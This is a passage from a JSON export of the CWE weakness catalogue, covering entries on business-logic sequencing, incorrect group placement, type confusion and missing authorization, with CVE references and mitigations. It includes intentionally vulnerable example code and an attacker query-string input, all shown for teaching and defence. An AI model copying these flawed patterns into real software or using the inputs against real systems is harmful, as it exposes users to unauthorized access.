          "Note": "An attacker could cause the product to skip critical steps or perform them in the wrong order, bypassing its intended business logic. This can sometimes have security implications."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "This code is part of an FTP server and deals with various commands that could be sent by a user. It is intended that a user must successfully login before performing any other action such as retrieving or listing files."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\tdef dispatchCommand(command, user, args):\n\t\t\tif command == 'Login':\n\t\t\t\tloginUser(args)\n\t\t\t\treturn\n```\n# user has requested a file* \n\t\t\tif command == 'Retrieve_file': \n\t\t\t```\n\t\t\t\t if authenticated(user) and ownsFile(user,args): \n\t\t\t\t\tsendFile(args)\n\t\t\t\t\treturn\n\t\t\tif command == 'List_files':\n\t\t\t\tlistFiles(args)\n\t\t\t\treturn\n```\n...*"
            },
            {
              "BodyText": "The server correctly avoids sending files to a user that isn't logged in and doesn't own the file. However, the server will incorrectly list the files in any directory without confirming the command came from an authenticated user, and that the user is authorized to see the directory's contents."
            },
            {
              "BodyText": "Here is a fixed version of the above example:"
            },
            {
              "Nature": "Good",
              "Language": "Python",
              "ExampleCode": "```\n\tdef dispatchCommand(command, user, args):\n```\n...* \n\t\t\tif command == 'List_files':\n\t\t\t```\n\t\t\t\tif authenticated(user) and ownsDirectory(user,args):\n\t\t\t\t\tlistFiles(args)\n\t\t\t\t\treturn\n```\n...*"
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2011-0348",
          "Description": "Bypass of access/billing restrictions by sending traffic to an unrestricted destination before sending to a restricted destination.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0348"
        },
        {
          "Reference": "CVE-2007-3012",
          "Description": "Attacker can access portions of a restricted page by canceling out of a dialog.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3012"
        },
        {
          "Reference": "CVE-2009-5056",
          "Description": "Ticket-tracking system does not enforce a permission setting.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-5056"
        },
        {
          "Reference": "CVE-2004-2164",
          "Description": "Shopping cart does not close a database connection when user restores a previous order, leading to connection exhaustion.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2164"
        },
        {
          "Reference": "CVE-2003-0777",
          "Description": "Chain: product does not properly handle dropped connections, leading to missing NULL terminator (CWE-170) and segmentation fault.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0777"
        },
        {
          "Reference": "CVE-2005-3327",
          "Description": "Chain: Authentication bypass by skipping the first startup step as required by the protocol.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3327"
        },
        {
          "Reference": "CVE-2004-0829",
          "Description": "Chain: File server crashes when sent a \"find next\" request without an initial \"find first.\"",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0829"
        },
        {
          "Reference": "CVE-2010-2620",
          "Description": "FTP server allows remote attackers to bypass authentication by sending (1) LIST, (2) RETR, (3) STOR, or other commands without performing the required login steps first.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-2620"
        },
        {
          "Reference": "CVE-2005-3296",
          "Description": "FTP server allows remote attackers to list arbitrary directories as root by running the LIST command before logging in.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3296"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "WASC",
          "EntryID": "40",
          "EntryName": "Insufficient Process Validation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-795",
          "Authors": [
            "Jeremiah Grossman"
          ],
          "Title": "Business Logic Flaws and Yahoo Games",
          "PublicationYear": "2006",
          "PublicationMonth": "12",
          "PublicationDay": "08",
          "URL": "https://blog.jeremiahgrossman.com/2006/12/business-logic-flaws.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-796",
          "Authors": [
            "Jeremiah Grossman"
          ],
          "Title": "Seven Business Logic Flaws That Put Your Website At Risk",
          "PublicationYear": "2007",
          "PublicationMonth": "10",
          "URL": "https://docplayer.net/10021793-Seven-business-logic-flaws-that-put-your-website-at-risk.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-797",
          "Authors": [
            "WhiteHat Security"
          ],
          "Title": "Business Logic Flaws",
          "URL": "https://web.archive.org/web/20080720171327/http://www.whitehatsec.com/home/solutions/BL_auction.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-806",
          "Authors": [
            "WASC"
          ],
          "Title": "Insufficient Process Validation",
          "URL": "http://projects.webappsec.org/w/page/13246943/Insufficient-Process-Validation"
        },
        {
          "ExternalReferenceID": "REF-799",
          "Authors": [
            "Rafal Los",
            "Prajakta Jagdale"
          ],
          "Title": "Defying Logic: Theory, Design, and Implementation of Complex Systems for Testing Application Logic",
          "PublicationYear": "2011",
          "URL": "https://www.slideshare.net/RafalLos/defying-logic-business-logic-testing-with-automation",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-667",
          "Authors": [
            "Rafal Los"
          ],
          "Title": "Real-Life Example of a 'Business Logic Defect' (Screen Shots!)",
          "PublicationYear": "2011",
          "URL": "http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581"
        },
        {
          "ExternalReferenceID": "REF-801",
          "Authors": [
            "Viktoria Felmetsger",
            "Ludovico Cavedon",
            "Christopher Kruegel",
            "Giovanni Vigna"
          ],
          "Title": "Toward Automated Detection of Logic Vulnerabilities in Web Applications",
          "Publication": "USENIX Security Symposium 2010",
          "PublicationYear": "2010",
          "PublicationMonth": "08",
          "URL": "https://www.usenix.org/legacy/events/sec10/tech/full_papers/Felmetsger.pdf",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-802",
          "Section": "pages 29 - 41",
          "Authors": [
            "Faisal Nabi"
          ],
          "Title": "Designing a Framework Method for Secure Business Application Logic Integrity in e-Commerce Systems",
          "Publication": "International Journal of Network Security, Vol.12, No.1",
          "PublicationYear": "2011",
          "URL": "http://ijns.femto.com.tw/contents/ijns-v12-n1/ijns-2011-v12-n1-p29-41.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Research Gap",
          "Note": "\n\nThis weakness is typically associated with business logic flaws, except when it produces resultant weaknesses.\n\n\nThe classification of business logic flaws has been under-studied, although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles.\n\n\nMany business logic flaws appear to be oriented toward business processes, application flows, and sequences of behaviors, which are not as well-represented in CWE as weaknesses related to input validation, memory management, etc.\n"
        }
      ]
    },
    {
      "ID": "842",
      "Name": "Placement of User into Incorrect Group",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product or the administrator places a user into an incorrect group.",
      "ExtendedDescription": "If the incorrect group has more access or privileges than the intended group, the user might be able to bypass intended security policy to access unexpected resources or perform unexpected actions. The access-control system might not be able to detect malicious usage of this group membership.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "286",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity"
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-1999-1193",
          "Description": "Operating system assigns user to privileged wheel group, allowing the user to gain root privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-1999-1193"
        },
        {
          "Reference": "CVE-2010-3716",
          "Description": "Chain: drafted web request allows the creation of users with arbitrary group membership.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3716"
        },
        {
          "Reference": "CVE-2008-5397",
          "Description": "Chain: improper processing of configuration options causes users to contain unintended group memberships.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5397"
        },
        {
          "Reference": "CVE-2007-6644",
          "Description": "CMS does not prevent remote administrators from promoting other users to the administrator group, in violation of the intended security model.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-6644"
        },
        {
          "Reference": "CVE-2007-3260",
          "Description": "Product assigns members to the root group, allowing escalation of privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-3260"
        },
        {
          "Reference": "CVE-2002-0080",
          "Description": "Chain: daemon does not properly clear groups before dropping privileges.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0080"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "843",
      "Name": "Access of Resource Using Incompatible Type ('Type Confusion')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type.",
      "ExtendedDescription": "\n\nWhen the product accesses the resource using an incompatible type, this could trigger logical errors because the resource does not have expected properties. In languages without memory safety, such as C and C++, type confusion can lead to out-of-bounds memory access.\n\n\nWhile this weakness is frequently associated with unions when parsing data with many different embedded object types in C, it can be present in any application that can interpret the same variable or memory location in multiple ways.\n\n\nThis weakness is not unique to C and C++. For example, errors in PHP applications can be triggered by providing array parameters when scalars are expected, or vice versa. Languages such as Perl, which perform automatic conversion of a variable of one type when it is accessed as if it were another type, can also contain these issues.\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "704",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "704",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "119",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Object Type Confusion"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability",
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory",
            "Modify Memory",
            "Execute Unauthorized Code or Commands",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "When a memory buffer is accessed using the wrong type, it could read or write memory out of the bounds of the buffer, if the allocated buffer is smaller than the type that the code is attempting to access, leading to a crash and possibly code execution."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-188",
          "Entries": [
            {
              "IntroText": "The following code uses a union to support the representation of different types of messages. It formats messages differently, depending on their type."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define NAME_TYPE 1\n\t#define ID_TYPE 2\n\tstruct MessageBuffer\n\t{\n\t\tint msgType;\n\t\tunion {\n\t\t\tchar *name;\n\t\t\tint nameID;\n\t\t};\n\t};\n\tint main (int argc, char **argv) {\n\t\t\tstruct MessageBuffer buf;\n\t\t\tchar *defaultMessage = \"Hello World\";\n\t\t\tbuf.msgType = NAME_TYPE;\n\t\t\tbuf.name = defaultMessage;\n\t\t\tprintf(\"Pointer of buf.name is %p\\n\", buf.name);\n```\n/* This particular value for nameID is used to make the code architecture-independent. If coming from untrusted input, it could be any value. */* \n\t\t\t\n\t\t\tbuf.nameID = (int)(defaultMessage + 1);\n\t\t\tprintf(\"Pointer of buf.name is now %p\\n\", buf.name);\n\t\t\tif (buf.msgType == NAME_TYPE) {\n\t\t\t```\n\t\t\t\tprintf(\"Message: %s\\n\", buf.name);\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprintf(\"Message: Use ID %d\\n\", buf.nameID);\n\t\t\t}\n\t}\n```"
            },
            {
              "BodyText": "The code intends to process the message as a NAME_TYPE, and sets the default message to \"Hello World.\" However, since both buf.name and buf.nameID are part of the same union, they can act as aliases for the same memory location, depending on memory layout after compilation."
            },
            {
              "BodyText": "As a result, modification of buf.nameID - an int - can effectively modify the pointer that is stored in buf.name - a string."
            },
            {
              "BodyText": "Execution of the program might generate output such as:"
            },
            {
              "BodyText": "```\n\t\tPointer of name is 10830\n\t\tPointer of name is now 10831\n\t\tMessage: ello World\n```"
            },
            {
              "BodyText": "Notice how the pointer for buf.name was changed, even though buf.name was not explicitly modified."
            },
            {
              "BodyText": "In this case, the first \"H\" character of the message is omitted. However, if an attacker is able to fully control the value of buf.nameID, then buf.name could contain an arbitrary pointer, leading to out-of-bounds reads or writes."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following PHP code accepts a value, adds 5, and prints the sum."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$value = $_GET['value'];\n\t$sum = $value + 5;\n\techo \"value parameter is '$value'<p>\";\n\techo \"SUM is $sum\";\n```"
            },
            {
              "BodyText": "When called with the following query string:"
            },
            {
              "BodyText": "```\n\t\tvalue=123\n```"
            },
            {
              "BodyText": "the program calculates the sum and prints out:"
            },
            {
              "BodyText": "```\n\t\tSUM is 128\n```"
            },
            {
              "BodyText": "However, the attacker could supply a query string such as:"
            },
            {
              "BodyText": "```\n\t\tvalue[]=123\n```"
            },
            {
              "BodyText": "The \"[]\" array syntax causes $value to be treated as an array type, which then generates a fatal error when calculating $sum:"
            },
            {
              "BodyText": "```\n\t\tFatal error: Unsupported operand types in program.php on line 2\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "The following Perl code is intended to look up the privileges for user ID's between 0 and 3, by performing an access of the $UserPrivilegeArray reference. It is expected that only userID 3 is an admin (since this is listed in the third element of the array)."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tmy $UserPrivilegeArray = [\"user\", \"user\", \"admin\", \"user\"];\n\tmy $userID = get_current_user_ID();\n\tif ($UserPrivilegeArray eq \"user\") {\n\t\tprint \"Regular user!\\n\";\n\t}\n\telse {\n\t\tprint \"Admin!\\n\";\n\t}\n\tprint \"\\$UserPrivilegeArray = $UserPrivilegeArray\\n\";\n```"
            },
            {
              "BodyText": "In this case, the programmer intended to use \"$UserPrivilegeArray->{$userID}\" to access the proper position in the array. But because the subscript was omitted, the \"user\" string was compared to the scalar representation of the $UserPrivilegeArray reference, which might be of the form \"ARRAY(0x229e8)\" or similar."
            },
            {
              "BodyText": "Since the logic also \"fails open\" (CWE-636), the result of this bug is that all users are assigned administrator privileges."
            },
            {
              "BodyText": "While this is a forced example, it demonstrates how type confusion can have security consequences, even in memory-safe languages."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2010-4577",
          "Description": "Type confusion in CSS sequence leads to out-of-bounds read.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4577"
        },
        {
          "Reference": "CVE-2011-0611",
          "Description": "Size inconsistency allows code execution, first discovered when it was actively exploited in-the-wild.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0611"
        },
        {
          "Reference": "CVE-2010-0258",
          "Description": "Improperly-parsed file containing records of different types leads to code execution when a memory location is interpreted as a different object than intended.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-0258"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP39-C",
          "EntryName": "Do not access a variable through a pointer of an incompatible type",
          "MappingFit": "Exact"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-811",
          "Section": "\"Type Confusion Vulnerabilities,\" page 59",
          "Authors": [
            "Mark Dowd",
            "Ryan Smith",
            "David Dewey"
          ],
          "Title": "Attacking Interoperability",
          "PublicationYear": "2009",
          "URL": "http://hustlelabs.com/stuff/bh2009_dowd_smith_dewey.pdf",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 7, \"Type Confusion\", Page 319",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Applicable Platform",
          "Note": "\n\nThis weakness is possible in any type-unsafe programming language.\n"
        },
        {
          "Type": "Research Gap",
          "Note": "\n\nType confusion weaknesses have received some attention by applied researchers and major software vendors for C and C++ code. Some publicly-reported vulnerabilities probably have type confusion as a root-cause weakness, but these may be described as \"memory corruption\" instead.\n\n\nFor other languages, there are very few public reports of type confusion weaknesses. These are probably under-studied. Since many programs rely directly or indirectly on loose typing, a potential \"type confusion\" behavior might be intentional, possibly requiring more manual analysis.\n"
        }
      ]
    },
    {
      "ID": "862",
      "Name": "Missing Authorization",
      "Abstraction": "Class",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action.",
      "ExtendedDescription": "\n\nAssuming a user with a given identity, authorization is the process of determining whether that user can access a given resource, based on the user's privileges and any permissions or other access-control specifications that apply to the resource.\n\n\nWhen access control checks are not applied, users are able to access data or perform actions that they should not be allowed to perform. This can lead to a wide range of problems, including information exposures, denial of service, and arbitrary code execution.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "285",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "284",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Often"
        },
        {
          "Type": "Technology",
          "Name": "Database Server",
          "Prevalence": "Often"
        }
      ],
      "BackgroundDetails": [
        "An access control list (ACL) represents who/what has permissions to a given object. Different operating systems implement (ACLs) in different ways. In UNIX, there are three types of permissions: read, write, and execute. Users are divided into three classes for file access: owner, group owner, and all other users where each class has a separate set of rights. In Windows NT, there are four basic types of permissions for files: \"No access\", \"Read access\", \"Change access\", and \"Full control\". Windows NT extends the concept of three types of users in UNIX to include a list of users and groups along with their associated permissions. A user can create an object (file) and assign specified permissions to that object."
      ],
      "AlternateTerms": [
        {
          "Term": "AuthZ",
          "Description": "\"AuthZ\" is typically used as an abbreviation of \"authorization\" within the web application security community. It is distinct from \"AuthN\" (or, sometimes, \"AuthC\") which is an abbreviation of \"authentication.\" The use of \"Auth\" as an abbreviation is discouraged, since it could be used for either authentication or authorization."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "\n\nOMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.\n\n\nAuthorization weaknesses may arise when a single-user application is ported to a multi-user environment.\n"
        },
        {
          "Phase": "Implementation",
          "Note": "A developer may introduce authorization weaknesses because of a lack of understanding about the underlying technologies. For example, a developer may assume that attackers cannot modify certain inputs such as headers or cookies."
        },
        {
          "Phase": "Operation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data",
            "Read Files or Directories"
          ],
          "Note": "An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data",
            "Modify Files or Directories"
          ],
          "Note": "An attacker could modify sensitive data, either by writing the data directly to a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to write the data."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Gain Privileges or Assume Identity",
            "Bypass Protection Mechanism"
          ],
          "Note": "An attacker could gain privileges by modifying or reading critical data directly, or by accessing privileged functionality."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-6",
          "Method": "Automated Static Analysis",
          "Description": "\n\nAutomated static analysis is useful for detecting commonly-used idioms for authorization. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authorization libraries.\n\n\nGenerally, automated static analysis tools have difficulty detecting custom authorization schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an authorization check; an automated technique that detects the absence of authorization may report false positives.\n",
          "Effectiveness": "Limited"
        },
        {
          "Method": "Automated Dynamic Analysis",
          "Description": "Automated dynamic analysis may find many or all possible interfaces that do not require authorization, but manual analysis is required to determine if the lack of authorization violates business logic."
        },
        {
          "Method": "Manual Analysis",
          "Description": "\n\nThis weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.\n\n\nSpecifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.\n",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules. However, manual efforts might not achieve desired code coverage within limited time constraints."
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Automated Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tHost Application Interface Scanner\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nDivide the product into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries.\n\n\nNote that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7]."
        },
        {
          "MitigationID": "MIT-4.4",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].\n"
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nFor web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.\n\n\nOne way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.\n"
        },
        {
          "Phase": [
            "System Configuration",
            "Installation"
          ],
          "Description": "Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a \"default deny\" policy when defining these ACLs."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-95",
          "Entries": [
            {
              "IntroText": "This function runs an arbitrary SQL query on a given database, returning the result of the query."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\tfunction runEmployeeQuery($dbName, $name){\n\t\tmysql_select_db($dbName,$globalDbHandle) or die(\"Could not open Database\".$dbName);\n```\n//Use a prepared statement to avoid CWE-89* \n\t\t$preparedStatement = $globalDbHandle->prepare('SELECT * FROM employees WHERE name = :name');\n\t\t$preparedStatement->execute(array(':name' => $name));\n\t\treturn $preparedStatement->fetchAll();}\n\t\n\t */.../* \n\t\n\t$employeeRecord = runEmployeeQuery('EmployeeDB',$_GET['EmployeeName']);"
            },
            {
              "BodyText": "While this code is careful to avoid SQL Injection, the function does not confirm the user sending the query is authorized to do so. An attacker may be able to obtain sensitive employee information from the database."
            }
          ]
        },
        {
          "ID": "DX-96",
          "Entries": [
            {
              "IntroText": "The following program could be part of a bulletin board system that allows users to send private messages to each other. This program intends to authenticate the user before deciding whether a private message should be displayed. Assume that LookupMessageObject() ensures that the $id argument is numeric, constructs a filename based on that id, and reads the message details from that file. Also assume that the program stores all private messages for all users in the same directory."
            },
            {
              "Nature": "Bad",
              "Language": "Perl",
              "ExampleCode": "```\n\tsub DisplayPrivateMessage {\n\t\tmy($id) = @_;\n\t\tmy $Message = LookupMessageObject($id);\n\t\tprint \"From: \" . encodeHTML($Message->{from}) . \"<br>\\n\";\n\t\tprint \"Subject: \" . encodeHTML($Message->{subject}) . \"\\n\";\n\t\tprint \"<hr>\\n\";\n\t\tprint \"Body: \" . encodeHTML($Message->{body}) . \"\\n\";\n\t}\n\tmy $q = new CGI;\n```\n# For purposes of this example, assume that CWE-309 and* \n\t\n\t\n\t\n\t *# CWE-523 do not apply.* \n\tif (! AuthenticateUser($q->param('username'), $q->param('password'))) {\n\t```\n\t\tExitError(\"invalid username or password\");\n\t}\n\tmy $id = $q->param('id');\n\tDisplayPrivateMessage($id);\n```"
            },
            {
              "BodyText": "While the program properly exits if authentication fails, it does not ensure that the message is addressed to the user. As a result, an authenticated attacker could provide any arbitrary identifier and read private messages that were intended for other users."
            },
            {
              "BodyText": "One way to avoid this problem would be to ensure that the \"to\" field in the message object matches the username of the authenticated user."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2022-24730",
          "Description": "Go-based continuous deployment product does not check that a user has certain privileges to update or create an app, allowing adversaries to read sensitive repository information",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2022-24730"
        },
        {
          "Reference": "CVE-2009-3168",
          "Description": "Web application does not restrict access to admin scripts, allowing authenticated users to reset administrative passwords.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3168"
        },
        {
          "Reference": "CVE-2009-3597",
          "Description": "Web application stores database file under the web root with insufficient access control (CWE-219), allowing direct request.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3597"
        },
        {
          "Reference": "CVE-2009-2282",
          "Description": "Terminal server does not check authorization for guest access.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2282"
        },
        {
          "Reference": "CVE-2008-5027",
          "Description": "System monitoring software allows users to bypass authorization by creating custom forms.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5027"
        },
        {
          "Reference": "CVE-2009-3781",
          "Description": "Content management system does not check access permissions for private files, allowing others to view those files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3781"
        },
        {
          "Reference": "CVE-2008-6548",
          "Description": "Product does not check the ACL of a page accessed using an \"include\" directive, allowing attackers to read unauthorized files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-6548"
        },
        {
          "Reference": "CVE-2009-2960",
          "Description": "Web application does not restrict access to admin scripts, allowing authenticated users to modify passwords of other users.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2960"
        },
        {
          "Reference": "CVE-2009-3230",
          "Description": "Database server does not use appropriate privileges for certain sensitive operations.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3230"
        },
        {
          "Reference": "CVE-2009-2213",
